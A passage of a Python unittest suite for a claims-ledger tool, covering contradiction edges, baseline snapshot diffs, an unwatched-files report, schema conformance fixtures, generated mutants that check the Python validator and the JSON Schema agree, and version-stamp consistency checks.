                         ["tr-000000d2", "tr-000000d3"])

    def test_hand_crafted_self_edge_is_inert(self):
        claims, _ = tm.fold(events(*self._base(),
                                   self._edge(a="tr-000000d1",
                                              b="tr-000000d1")))
        self.assertEqual(claims["tr-000000d1"]["status"], "live")

    def test_disputed_blocks_premises_and_queues_both(self):
        claims, _ = tm.fold(events(*self._base(), self._edge()))
        passes, _ = tm.premise_check("disputed", "P1")
        self.assertFalse(passes)
        rows = tm.queue_rows(claims, NOW)
        queued = {r["id"]: r["reason"] for r in rows}
        self.assertIn("tr-000000d1", queued)
        self.assertIn("tr-000000d2", queued["tr-000000d1"])

class TestBaseline(unittest.TestCase):
    """Issue #3 (10007): snapshot of one fold, delta of two."""
    def _events_a(self):
        return events(
            rec("claim", claim_p(), rid="tr-000000a1"),
            rec("claim", claim_p(text="second fact"), rid="tr-000000a2"),
            issue_rec(rid="wk-000000b1"))

    def _events_b(self):
        return self._events_a() + events(
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a3",
                ts="2026-07-02T00:00:00+00:00"),
            rec("claim", claim_p(text="third fact"), rid="tr-000000a4",
                ts="2026-07-02T00:00:00+00:00"),
            issue_ev("closed", ref="wk-000000b1", basis="done",
                     ts="2026-07-02T00:00:00+00:00"))

    def test_snapshot_counts_and_ids(self):
        s = tm.baseline_snapshot(self._events_a())
        self.assertEqual(s["records"], 3)
        self.assertEqual(s["claims"]["by_status"], {"unverified": 2})
        self.assertEqual(s["claims"]["ids"]["unverified"],
                         ["tr-000000a1", "tr-000000a2"])
        self.assertEqual(s["issues"]["by_status"], {"open": 1})
        self.assertEqual(s["claims"]["by_tier"], {"P2": 2})

    def test_snapshot_tier_excludes_retracted(self):
        evs = self._events_a() + events(
            rec("verdict", {"claim": "tr-000000a2", "verdict": "retracted",
                            "basis": "dead"}, rid="tr-000000a9",
                ts="2026-07-02T00:00:00+00:00"))
        s = tm.baseline_snapshot(evs)
        self.assertEqual(s["claims"]["by_tier"], {"P2": 1})
        self.assertEqual(s["claims"]["by_status"],
                         {"retracted": 1, "unverified": 1})

    def test_diff_born_transitions_no_disappeared(self):
        d = tm.baseline_diff(tm.baseline_snapshot(self._events_a()),
                             tm.baseline_snapshot(self._events_b()))
        self.assertEqual(d["claims"]["born"], {"tr-000000a4": "unverified"})
        self.assertEqual(d["claims"]["transitions"],
                         {"unverified->live": ["tr-000000a1"]})
        self.assertEqual(d["claims"]["disappeared"], {})
        self.assertEqual(d["issues"]["transitions"],
                         {"open->closed": ["wk-000000b1"]})
        self.assertEqual(d["records_delta"], 3)

    def test_diff_disappeared_flags_rewritten_history(self):
        # newer "ref" missing a record the older one has -- impossible in
        # an append-only descendant, so the diff must surface it
        d = tm.baseline_diff(tm.baseline_snapshot(self._events_a()),
                             tm.baseline_snapshot(self._events_a()[:1]))
        self.assertIn("tr-000000a2", d["claims"]["disappeared"])
        self.assertIn("wk-000000b1", d["issues"]["disappeared"])

    def test_snapshot_is_deterministic(self):
        import json as _json
        one = _json.dumps(tm.baseline_snapshot(self._events_b()),
                          sort_keys=True)
        two = _json.dumps(tm.baseline_snapshot(
            list(reversed(self._events_b()))), sort_keys=True)
        self.assertEqual(one, two)

class TestInverseReport(unittest.TestCase):
    """Issue #5 (24765 backward trace): tracked ∖ watched, where watched
    is the evidence_paths union of every non-retracted claim."""
    TRACKED = ["src/a.py", "src/deep/b.py", "docs/readme.md",
               "assets/logo.png", "lone.txt"]

    def _claims(self, *specs):
        """specs: (status, [paths]) -> fold-shaped claims dict."""
        return {f"tr-0000000{i}": {"status": status,
                                   "claim": {"payload":
                                             {"evidence_paths": paths}}}
                for i, (status, paths) in enumerate(specs)}

    def test_unwatched_files_are_dark_watched_are_not(self):
        claims = self._claims(("live", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"],
                         ["assets/logo.png", "docs/readme.md", "lone.txt"])
        self.assertEqual(rep["considered"], 5)

    def test_stale_and_diverged_still_watch(self):
        """A stale claim is knowledge needing re-check, not absence of
        knowledge -- its paths are not dark."""
        claims = self._claims(("stale", ["src/**"]),
                              ("diverged", ["docs/readme.md"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"], ["assets/logo.png", "lone.txt"])

    def test_retraction_kills_the_watch(self):
        claims = self._claims(("retracted", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

    def test_empty_ledger_everything_dark(self):
        rep = tm.inverse_report(self.TRACKED, {})
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

    def test_under_scopes_both_dark_and_considered(self):
        claims = self._claims(("live", ["src/a.py"]))
        rep = tm.inverse_report(self.TRACKED, claims, under="src")
        self.assertEqual(rep["dark"], ["src/deep/b.py"])
        self.assertEqual(rep["considered"], 2)
        # trailing slash must behave identically
        self.assertEqual(tm.inverse_report(self.TRACKED, claims,
                                           under="src/"), rep)

    def test_under_is_a_path_prefix_not_a_string_prefix(self):
        rep = tm.inverse_report(["srcery/x.py", "src/a.py"], {},
                                under="src")
        self.assertEqual(rep["dark"], ["src/a.py"])

    def test_exclude_prefixes_drop_files(self):
        claims = self._claims(("live", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims,
                                excludes=["assets", "lone.txt"])
        self.assertEqual(rep["dark"], ["docs/readme.md"])
        self.assertEqual(rep["considered"], 3)

    def test_output_is_sorted_and_deterministic(self):
        rep = tm.inverse_report(list(reversed(self.TRACKED)), {})
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

# ------------------------------------------ schema conformance (shared corpus)

# Each fixture: (name, record, expected_valid). This corpus is the single
# source of truth for BOTH contract representations.
CORPUS = [
    ("unverified claim minimal", rec("claim", claim_p()), True),
    ("verified claim full", rec("claim", verified_p()), True),
    ("verified via ttl only", rec("claim", verified_p(evidence_paths=[],
                                                      ttl_days=7)), True),
    ("verified missing evidence",
     rec("claim", claim_p(evidence_class="VERIFIED")), False),
    ("inferred with basis",
     rec("claim", claim_p(evidence_class="INFERRED", basis="convention")), True),
    ("inferred missing basis",
     rec("claim", claim_p(evidence_class="INFERRED")), False),
    # v0.5.5: the mirror had drifted from the schema on exactly these two --
    # a record with no text passed validate while the schema rejected it.
    ("claim empty text", rec("claim", claim_p(text="")), False),
    ("claim missing text",
     rec("claim", {k: v for k, v in claim_p().items() if k != "text"}), False),
    ("bad tier", rec("claim", claim_p(cost_tier="P9")), False),
    ("bad class", rec("claim", claim_p(evidence_class="GUESSED")), False),
    ("bad envelope id", rec("claim", claim_p(), rid="claim-1"), False),
    ("verdict ok", rec("verdict", {"claim": "tr-00000001",
                                   "verdict": "agree", "basis": "b"}), True),
    ("verdict retracted ok", rec("verdict", {"claim": "tr-00000001",
                                             "verdict": "retracted",
                                             "basis": "b"}), True),
    ("verdict bad value", rec("verdict", {"claim": "tr-00000001",
                                          "verdict": "maybe", "basis": "b"}), False),
    ("verdict bad claim ref", rec("verdict", {"claim": "nope",
                                              "verdict": "agree", "basis": "b"}), False),
    ("verdict missing basis", rec("verdict", {"claim": "tr-00000001",
                                              "verdict": "agree"}), False),
    ("invalidation ok", rec("invalidation", {"claim": "tr-00000001",
                                             "commit": "abc1234",
                                             "reason": "ttl expired"}), True),
    ("invalidation missing commit",
     rec("invalidation", {"claim": "tr-00000001"}), False),
    # ADR-027: anchor_commit/commit carry a git SHA prefix (>=7 everywhere
    # the system emits one). The fs2 mutant generator is BLIND to this floor
    # (it emits no null, and its junk literal is 7 chars), so these explicit
    # fixtures carry the constraint across both contract surfaces.
    ("verified claim sub-7 anchor",
     rec("claim", verified_p(anchor_commit="abc123")), False),
    ("verified claim null anchor",
     rec("claim", verified_p(anchor_commit=None)), False),
    ("unverified claim sub-7 anchor",
     rec("claim", claim_p(anchor_commit="abc")), False),
    ("unverified claim null anchor ok",
     rec("claim", claim_p(anchor_commit=None)), True),
    ("unverified claim 7-char anchor ok",
     rec("claim", claim_p(anchor_commit="abc1234")), True),
    ("verdict sub-7 anchor",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": "abc"}), False),
    ("verdict null anchor",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": None}), False),
    ("verdict 7-char anchor ok",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": "abc1234"}), True),
    ("invalidation sub-7 commit",
     rec("invalidation", {"claim": "tr-00000001", "commit": "abc"}), False),
    ("premise ok", rec("premise", {"issue": "bd-x1",
                                   "claim": "tr-00000001"}), True),
    ("premise missing issue", rec("premise", {"claim": "tr-00000001"}), False),
    # ---- premise supersede (ADR-013, v0.6.4) ----
    ("premise supersedes ok", rec("premise", {"issue": "bd-x1",
                                              "claim": "tr-00000001",
                                              "supersedes": "tr-00000002"}),
     True),
    ("premise supersedes bad ref", rec("premise", {"issue": "bd-x1",
                                                   "claim": "tr-00000001",
                                                   "supersedes": "nonsense"}),
     False),
    ("unknown kind", rec("wish", {"claim": "tr-00000001"}), False),
    # ---- work kernel (ADR-002, v0.5) ----
    ("issue ok", issue_rec(deps=["wk-00000002"],
                           premises=["tr-00000001"]), True),
    ("issue missing title", issue_rec(title=""), False),
    ("issue with tr envelope id", issue_rec(rid="tr-00000001"), False),
    ("issue bad dep ref", issue_rec(deps=["bd-x1"]), False),
    ("issue bad premise ref", issue_rec(premises=["nope"]), False),
    ("issue_event claimed ok", issue_ev("claimed"), True),
    ("issue_event closed with basis", issue_ev("closed", basis="done"), True),
    ("issue_event closed missing basis",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed"}), False),
    ("issue_event bad event", issue_ev("paused"), False),
    ("issue_event bad ref", issue_ev("claimed", ref="bd-x1"), False),
    ("issue_event with wk envelope id",
     issue_ev("claimed", rid="wk-00000009"), False),
    # ---- solo-regime hardening (v0.6) ----
    ("claim with scope_basis",
     rec("claim", claim_p(scope_basis="quantifier scoped to services/")), True),
    ("claim empty scope_basis",
     rec("claim", claim_p(scope_basis="")), False),
    # MEDIUM-1: --duplicate-ok override trace
    ("claim with overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=["tr-00000001",
                                                 "tr-00000002"])), True),
    ("claim empty overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=[])), False),
    ("claim overridden_duplicates bad ref",
     rec("claim", claim_p(overridden_duplicates=["nope"])), False),
    ("verified evidence screened false",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": False})), True),
    ("verified evidence screened non-boolean",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": "yes"})), False),
    ("verdict mechanical subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "mechanical"}), True),
    ("verdict bad subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "cosmic"}), False),
    ("claim negative ttl", rec("claim", claim_p(ttl_days=-1)), False),
    ("empty envelope actor", rec("claim", claim_p()) | {"actor": ""}, False),
    # ---- acceptance oracles (ADR-014, v0.7) ----
    ("issue accept ok",
     issue_rec(accept={"command": "pytest -q", "kind": "verification",
                       "screened": True}), True),
    ("issue accept validation kind",
     issue_rec(accept={"command": "python3 run.py --strict",
                       "kind": "validation", "screened": False}), True),
    ("issue accept missing command",
     issue_rec(accept={"kind": "verification", "screened": True}), False),
    ("issue accept bad kind",
     issue_rec(accept={"command": "pytest -q", "kind": "vibes",
                       "screened": True}), False),
    ("issue accept screened non-boolean",
     issue_rec(accept={"command": "pytest -q", "kind": "verification",
                       "screened": "yes"}), False),
    ("issue_event accept executed ok",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True, "returncode": 0}}),
     True),
    ("issue_event accept executed nonzero returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True, "returncode": 1}}),
     False),
    ("issue_event accept executed missing returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True}}), False),
    ("issue_event accept unexecuted ok",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "eval x",
                                    "kind": "verification",
                                    "executed": False, "screened": False}}),
     True),
    # ---- contradicts edge (issue #4, v0.9) ----
    ("contradicts ok",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002",
                         "basis": "cannot both hold"}), True),
    ("contradicts missing basis",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002"}), False),
    ("contradicts bad ref",
     rec("contradicts", {"a": "nope", "b": "tr-00000002",
                         "basis": "x"}), False),
    # self-edge: schema-VALID (draft-07 cannot compare properties, and
    # the mirror may not be stricter) -- refused at intake, inert in fold
    ("contradicts self edge schema-tolerated",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000001",
                         "basis": "x"}), True),
    ("contradicts with wk envelope id",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002",
                         "basis": "x"}, rid="wk-00000009"), False),
    ("issue_event accept executed non-boolean",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": "yes"}}), False),
    # MEDIUM-3: an unexecuted acceptance must not carry a returncode
    ("issue_event accept unexecuted with returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "eval x",
                                    "kind": "verification",
                                    "executed": False, "screened": False,
                                    "returncode": 0}}), False),
    # ---- canonical ts profile (ADR-015, v0.8.1) -- the fold sorts the
    # raw ts string, so every non-canonical form must be rejected by
    # schema pattern and mirror alike ----
    ("ts with Z suffix",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00.000000Z"), False),
    ("ts with non-UTC offset",
     rec("claim", claim_p(), ts="2026-07-01T05:00:00.000000+05:00"), False),
    ("ts without microseconds",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00+00:00"), False),
    ("ts tz-naive",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00.000000"), False),
]

class TestConformancePython(unittest.TestCase):
    def test_corpus_against_validate_events(self):
        for name, record, expected in CORPUS:
            errors = tm.validate_events([(1, record)])
            self.assertEqual(not errors, expected,
                             f"{name}: validate_events said {errors or 'valid'}")

def _load_jsonschema():
    try:
        import jsonschema
        return jsonschema
    except ImportError:
        return None

JSONSCHEMA = _load_jsonschema()

class TestJsonschemaPresent(unittest.TestCase):
    """v0.4: the drift detector previously FAILED OPEN -- without the
    optional jsonschema package the suite went green with the durable
    contract unchecked. Now absence is a failure unless explicitly waived
    (TRUTH_ALLOW_NO_JSONSCHEMA=1), so 'cannot drift silently' is
    unconditional in CI."""
    def test_drift_detector_armed(self):
        if JSONSCHEMA is None and \
                os.environ.get("TRUTH_ALLOW_NO_JSONSCHEMA") != "1":
            self.fail("jsonschema not installed: the JSON Schema half of the "
                      "contract is UNCHECKED. pip install jsonschema, or waive "
                      "explicitly with TRUTH_ALLOW_NO_JSONSCHEMA=1.")

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; python mirror still tested")
class TestConformanceSchema(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.schema = json.load(f)
        cls.validator = JSONSCHEMA.Draft7Validator(cls.schema)

    def test_corpus_against_json_schema(self):
        for name, record, expected in CORPUS:
            errs = list(self.validator.iter_errors(record))
            self.assertEqual(not errs, expected,
                             f"{name}: JSON Schema said "
                             f"{[e.message for e in errs] or 'valid'}")

    def test_both_representations_agree_everywhere(self):
        for name, record, _ in CORPUS:
            py_ok = not tm.validate_events([(1, record)])
            js_ok = not list(self.validator.iter_errors(record))
            self.assertEqual(py_ok, js_ok,
                             f"CONTRACT DRIFT on '{name}': python={py_ok} schema={js_ok}")

# ---------------------- constraint-enumerated conformance corpus (FS-2)
#
# F1 and F8 were one defect class twice: two hand-maintained contract
# copies drifting, sampled by a hand-curated corpus. This generator
# derives mutants MECHANICALLY from every valid seed record -- delete
# each field, empty each string, junk each enum-ish value -- and asserts
# only AGREEMENT: whatever each validator says, they must say the same
# thing. A constraint added to the schema automatically grows mutants; a
# mirror that lags fails the suite the same day, not at the next audit.

def _clone(r):
    return json.loads(json.dumps(r))

def fs2_mutants(record):
    """Yield (name, mutant) pairs enumerating the constraint surface:
    envelope fields, one level of payload, one level of payload dicts."""
    out = []
    for k in list(record):
        m = _clone(record); del m[k]; out.append((f"del {k}", m))
        if isinstance(record[k], str):
            m = _clone(record); m[k] = ""; out.append((f"empty {k}", m))
            m = _clone(record); m[k] = "__XXX__"; out.append((f"junk {k}", m))
    p = record.get("payload")
    if not isinstance(p, dict):
        return out
    for k in list(p):
        m = _clone(record); del m["payload"][k]
        out.append((f"del payload.{k}", m))
        v = p[k]
        if isinstance(v, str):
            for nv, tag in (("", "empty"), ("__XXX__", "junk")):
                m = _clone(record); m["payload"][k] = nv
                out.append((f"{tag} payload.{k}", m))
        elif isinstance(v, bool):
            m = _clone(record); m["payload"][k] = "__XXX__"
            out.append((f"junk payload.{k}", m))
        elif isinstance(v, int):
            m = _clone(record); m["payload"][k] = -1
            out.append((f"neg payload.{k}", m))
        elif isinstance(v, list):
            m = _clone(record); m["payload"][k] = ["__XXX__"]
            out.append((f"junklist payload.{k}", m))
        elif isinstance(v, dict):
            for kk in list(v):
                m = _clone(record); del m["payload"][k][kk]
                out.append((f"del payload.{k}.{kk}", m))
                if isinstance(v[kk], str):
                    m = _clone(record); m["payload"][k][kk] = ""
                    out.append((f"empty payload.{k}.{kk}", m))
    return out

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; armed-detector test governs")
class TestGeneratedMutantsAgree(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.validator = JSONSCHEMA.Draft7Validator(json.load(f))

    def test_every_mutant_of_every_valid_seed_agrees(self):
        total = 0
        for seed_name, seed, valid in CORPUS:
            if not valid:
                continue
            for mut_name, mutant in fs2_mutants(seed):
                total += 1
                py_ok = not tm.validate_events([(1, mutant)])
                js_ok = not list(self.validator.iter_errors(mutant))
                self.assertEqual(
                    py_ok, js_ok,
                    f"CONTRACT DRIFT on generated mutant '{seed_name} / "
                    f"{mut_name}': python={py_ok} schema={js_ok}")
        # meta-canary: the generator is detection machinery and must not
        # fail open by generating nothing (the F1 lesson, applied to
        # F1's own fix)
        self.assertGreater(total, 200,
                           f"mutant generator produced only {total} cases")

# ---------------------- cross-surface version consistency (M1)
#
# Four surfaces carry a version stamp -- the CLI (scripts/truth line 2),
# the README title, the schema $id, the paper. M1 found them drifting by
# ~two minor versions because release discipline bumped bodies but not
# stamps, and NOTHING mechanical caught it. These tests make the two
# stamps that are a hard invariant decidable in the battery: the README
# title MUST equal the CLI version (git history shows they moved in
# lockstep every release until the v0.9.x spec-precision batch let the
# README lag), and the schema $id MUST carry the shape fingerprint below
# so a record-shape change (a new `kind`) cannot ship without a conscious
# $id bump (ADR-026). The paper deliberately reference-not-restates its
# version (it points at scripts/truth) and so has no stamp to pin.

_VER_RE = __import__("re").compile(r"v(\d+\.\d+\.\d+)")

def _cli_version():
    with open(os.path.join(HERE, "truth")) as f:
        f.readline()                       # shebang
        m = _VER_RE.search(f.readline())   # `"""truth vX.Y.Z -- ...`
    return m.group(1) if m else None

def _readme_version():
    path = os.path.join(HERE, "..", ".truth", "README.md")
    with open(path) as f:
        m = _VER_RE.search(f.readline())   # `# .truth ... (vX.Y.Z)`
    return m.group(1) if m else None

class TestCrossSurfaceVersions(unittest.TestCase):
    """M1: the version stamps that are a hard invariant agree, mechanically."""

    def test_readme_title_equals_cli_version(self):
        cli, readme = _cli_version(), _readme_version()
        self.assertIsNotNone(cli, "could not read CLI version (truth line 2)")
        self.assertIsNotNone(readme, "could not read README title version")
        self.assertEqual(
            readme, cli,
            f"cross-surface drift (M1): README title v{readme} != CLI "
            f"v{cli}. They moved in lockstep every release until v0.9.x; a "
            f"release MUST bump both. Update the README title (ADR-026).")

    # ADR-026: the schema $id is a SCHEMA-CONTRACT version (two-component,
    # independent of the product version), bumped only when the record
    # SHAPE changes. It lapsed three times (v0.8.1 ts pattern, v0.9.0
    # contradicts kind, v0.9.1/2 field additions) because nothing tied the
    # $id to the shape and no test could see it. This pins the shape: any
    # edit to the schema (minus its own $id) breaks the fingerprint, forcing
    # a conscious "is this a shape change? then bump $id" review.
    EXPECTED_SCHEMA_ID = "truth-ledger-record.v0.9"
    PINNED_SHAPE_SHA256 = \
        "847c25d85d31aaed7f5b92358cb310ee9eec7aa83c5111d3703d9f11e9af47d9"

    def _schema(self):
        import json as _json
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path) as f:
            return _json.load(f)

    def test_schema_id_is_pinned(self):
        self.assertEqual(
            self._schema().get("$id"), self.EXPECTED_SCHEMA_ID,
            "schema $id changed unexpectedly. The $id is the schema-contract "
            "version (ADR-026): bump it ONLY on a record-shape change, then "
            "update EXPECTED_SCHEMA_ID here.")

    def test_schema_shape_fingerprint(self):
        import json as _json, hashlib, copy
        shape = copy.deepcopy(self._schema())
        shape.pop("$id", None)
        fp = hashlib.sha256(_json.dumps(
            shape, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
        self.assertEqual(
            fp, self.PINNED_SHAPE_SHA256,
            "the record SHAPE changed (schema minus $id). If this is a "
            "contract shape change (new kind / field / constraint), BUMP the "
            "$id to the next minor and EXPECTED_SCHEMA_ID (ADR-026), then "
            "update PINNED_SHAPE_SHA256. If it is a pure comment/description "
            "edit, just update PINNED_SHAPE_SHA256. This test exists because "
            "the $id silently lapsed three times when nobody could see it.")

if __name__ == "__main__":
    unittest.main(verbosity=1)
